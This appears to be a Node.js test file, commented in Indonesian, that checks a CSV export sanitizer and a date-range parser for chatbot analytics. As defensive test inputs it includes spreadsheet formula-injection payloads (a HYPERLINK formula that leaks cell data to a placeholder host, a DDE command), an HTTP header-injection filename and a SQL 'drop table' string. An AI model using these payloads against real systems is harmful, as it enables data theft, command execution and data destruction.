import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';

import { sel, baris, tabel, berbagian, namaBerkas, BOM } from '../src/modules/core/csv';
import { susunRentang, awalTampil, MAKS_HARI } from '../src/modules/chat/rentang';

/**
 * EKSPOR CSV & RENTANG TANGGAL.
 *
 * Dua kelas kegagalan yang sama-sama TIDAK melempar apa pun: berkas yang
 * mengeksekusi rumus di komputer penerima, dan laporan yang angkanya salah
 * tapi terlihat masuk akal. Yang kedua lebih berbahaya — ia dibawa ke rapat.
 */

/* ── suntikan rumus ──────────────────────────────────────────────────── */

test('sel yang diawali rumus DINETRALKAN', () => {
  /* Pertanyaan pengunjung masuk apa adanya ke kolom "Pertanyaan". Satu
     pertanyaan `=HYPERLINK(...)` berubah jadi penyedot data begitu pemilik
     bisnis membuka laporannya di Excel. Ini kerentanan kita, bukan Excel. */
  for (const jahat of ['=1+1', '+1', '-1+2', '@SUM(A1)', '\tcmd', '\rcmd',
    '=HYPERLINK("http://x"&A1,"klik")', '=cmd|\' /c calc\'!A1']) {
    /* Kutip pengaman ada DI DALAM lapisan kutip CSV bila selnya juga perlu
       dikutip (mis. yang memuat \r atau koma) — jadi diperiksa setelah
       lapisan itu dilepas, bukan di karakter pertama mentahnya. */
    const s = sel(jahat);
    const isi = s.startsWith('"') ? s.slice(1) : s;
    assert.ok(isi.startsWith("'"), `tak dinetralkan: ${JSON.stringify(jahat)} → ${JSON.stringify(s)}`);
  }
  // Teks biasa tak boleh ikut dirusak — laporan yang tiap selnya berkutip
  // tunggal tak terbaca manusia.
  assert.equal(sel('berapa nilai kontrak'), 'berapa nilai kontrak');
  assert.equal(sel('PT Arta Sejahtera'), 'PT Arta Sejahtera');
});

test('ANGKA tak pernah lewat jalur penetralan', () => {
  /* Kalau angka negatif dinetralkan jadi teks `'-5`, seluruh kolom berhenti
     bisa dijumlahkan di Excel — laporan angka yang angkanya bukan angka. */
  assert.equal(sel(-5), '-5');
  assert.equal(sel(0), '0');
  assert.equal(sel(0.4213), '0.4213');
  // NaN/Infinity jadi kosong, bukan tulisan "NaN" yang terbaca sebagai teks.
  assert.equal(sel(NaN), '');
  assert.equal(sel(Infinity), '');
});

test('pemisah, kutip, dan baris baru di dalam sel tidak menggeser kolom', () => {
  assert.equal(sel('a,b'), '"a,b"');
  assert.equal(sel('dia bilang "halo"'), '"dia bilang ""halo"""');
  assert.equal(sel('baris1\nbaris2'), '"baris1\nbaris2"');
  // Gabungan terburuk: koma + kutip + baris baru + awalan rumus.
  const s = sel('=a,"b"\nc');
  assert.ok(s.startsWith('"\'='), `bentuk salah: ${s}`);
  assert.ok(s.endsWith('"'));
  assert.equal(baris(['a,b', 1, null]).split(',').length, 4); // "a,b" terhitung 2 karena dikutip
});

test('kosong dan null jadi sel kosong, bukan tulisan "null"', () => {
  assert.equal(sel(null), '');
  assert.equal(sel(undefined), '');
  assert.equal(baris([null, undefined, '']), ',,');
});

test('berkas diawali BOM dan berakhiran CRLF', () => {
  /* Tanpa BOM, Excel di Windows membaca CSV sebagai ANSI dan seluruh huruf
     beraksen rusak — laporan terlihat cacat padahal datanya benar. */
  const t = tabel(['a'], [[1]]);
  assert.ok(t.startsWith(BOM), 'tak ada BOM UTF-8');
  assert.ok(t.includes('\r\n'), 'bukan CRLF');
  assert.ok(t.endsWith('\r\n'));
  const b = berbagian([{ judul: 'X', header: ['a'], isi: [[1]] }]);
  assert.ok(b.startsWith(BOM));
});

test('nama berkas tak bisa memecah header HTTP', () => {
  /* Baris baru di Content-Disposition menyisipkan header baru sama sekali
     (response splitting); kutip memutus nilainya di tengah. */
  const n = namaBerkas('Chatbot "Utama"\r\nX-Injected: 1', '2026-07-01', '2026-07-31');
  assert.ok(!/["\r\n;,]/.test(n), `nama berkas belum aman: ${n}`);
  assert.ok(n.endsWith('.csv'));
  // Nama yang seluruhnya tersaring tetap menghasilkan nama yang sah.
  assert.ok(namaBerkas('«»', '2026-01-01', '2026-01-02').startsWith('analitik-'));
});

/* ── rentang tanggal ─────────────────────────────────────────────────── */

const T = Date.parse('2026-07-31T10:00:00.000Z');

test('tanggal akhir INKLUSIF bagi pengguna', () => {
  /* Orang yang memilih 1–31 Juli bermaksud ikut menghitung tanggal 31.
     Kueri memakai `< akhir`, jadi batasnya harus digeser satu hari. Tanpa itu
     laporan diam-diam kehilangan hari terakhir — justru hari yang paling
     sering dilihat orang. */
  const r = susunRentang({ dari: '2026-07-01', sampai: '2026-07-31' }, T);
  assert.equal(r.awal, '2026-07-01T00:00:00.000Z');
  assert.equal(r.akhir, '2026-08-01T00:00:00.000Z');
  assert.equal(r.hari, 31);
  assert.equal(r.akhirTampil, '2026-07-31');
  assert.equal(awalTampil(r), '2026-07-01');
  // Satu hari tetap satu hari, bukan nol.
  assert.equal(susunRentang({ dari: '2026-07-05', sampai: '2026-07-05' }, T).hari, 1);
});

test('rentang TERBALIK ditolak, bukan ditukar diam-diam', () => {
  /* Menukarnya akan mengubah laporan yang salah ketik jadi laporan yang
     terlihat benar, dan yang membawanya ke rapat takkan pernah tahu ia
     memilih rentang lain. */
  assert.throws(() => susunRentang({ dari: '2026-07-31', sampai: '2026-07-01' }, T),
    /mendahului/);
});

test('satu ujung saja ditolak — menebak ujung lain berarti mengarang', () => {
  assert.throws(() => susunRentang({ dari: '2026-07-01' }, T), /kedua tanggal/);
  assert.throws(() => susunRentang({ sampai: '2026-07-31' }, T), /kedua tanggal/);
});

test('bentuk tanggal salah ditolak, tak diteruskan ke SQL', () => {
  for (const buruk of ['31-07-2026', '2026/07/31', 'kemarin', "2026-07-01'; drop table users--"]) {
    assert.throws(() => susunRentang({ dari: buruk, sampai: '2026-07-31' }, T),
      /YYYY-MM-DD|tidak sah/, `diterima: ${buruk}`);
  }
});

test('jendela dibatasi MAKS_HARI di kedua jalur', () => {
  /* Batas ada supaya kueri tak memindai messages yang terus tumbuh. Jalur
     preset membatasi dengan memangkas; jalur rentang menolak — memangkas
     rentang yang dipilih eksplisit akan memberi laporan yang bukan yang
     diminta, tanpa memberitahu. */
  assert.equal(susunRentang({ hari: 100000 }, T).hari, MAKS_HARI);
  assert.equal(susunRentang({ hari: 0 }, T).hari, 1);
  assert.equal(susunRentang({ hari: -5 }, T).hari, 1);
  assert.equal(susunRentang({ hari: 'bukan angka' }, T).hari, 30);
  assert.throws(() => susunRentang({ dari: '2020-01-01', sampai: '2026-07-31' }, T), /maksimal/);
});

test('tanpa parameter apa pun, perilaku lama utuh: 30 hari terakhir', () => {
  const r = susunRentang({}, T);
  assert.equal(r.hari, 30);
  assert.equal(r.akhir, new Date(T).toISOString());
  assert.equal(Date.parse(r.akhir) - Date.parse(r.awal), 30 * 86_400_000);
});

/* ── sambungan ke kueri ──────────────────────────────────────────────── */

test('SEMUA penyaring waktu punya batas ATAS, bukan hanya bawah', () => {
  /* Sebelumnya kueri hanya `>= since`, yang benar selama ujung atasnya selalu
     "sekarang". Begitu pengguna boleh memilih rentang yang berakhir di masa
     lalu, penyaring tanpa batas atas diam-diam ikut memuat seluruh data
     sesudahnya — dan angkanya tetap terlihat wajar. */
  const src = readFileSync('src/modules/chat/analytics.service.ts', 'utf8');
  const bawah = src.match(/(created_at|started_at) >= \$\{since\}/g) ?? [];
  const atas = src.match(/(created_at|started_at) < \$\{until\}/g) ?? [];
  assert.ok(bawah.length >= 7, `penyaring bawah hanya ${bawah.length} — bentuk berkas berubah`);
  assert.equal(atas.length, bawah.length,
    `${bawah.length} penyaring bawah tapi hanya ${atas.length} batas atas`);
});

test('CSV dan JSON dibaca dari SATU sumber, bukan dua kueri', () => {
  /* Dua jalur yang membaca sendiri-sendiri akan menyimpang perlahan, dan yang
     berbeda justru angka yang dicetak dan dibawa ke rapat — versi yang paling
     sulit dibantah dan paling jarang diperiksa ulang. */
  const rute = readFileSync('src/app/api/analytics/route.ts', 'utf8');
  assert.equal((rute.match(/analyticsService\.forChatbot/g) ?? []).length, 1,
    'service dipanggil lebih dari sekali — CSV dan JSON bisa menyimpang');
  const iPanggil = rute.indexOf('analyticsService.forChatbot');
  const iCsv = rute.indexOf("q.get('format') !== 'csv'");
  assert.ok(iPanggil > 0 && iCsv > iPanggil, 'CSV bercabang sebelum datanya diambil');
  assert.ok(/Content-Disposition/.test(rute) && /attachment/.test(rute));
  assert.ok(/namaBerkas\(/.test(rute), 'nama berkas tak disaring');
});
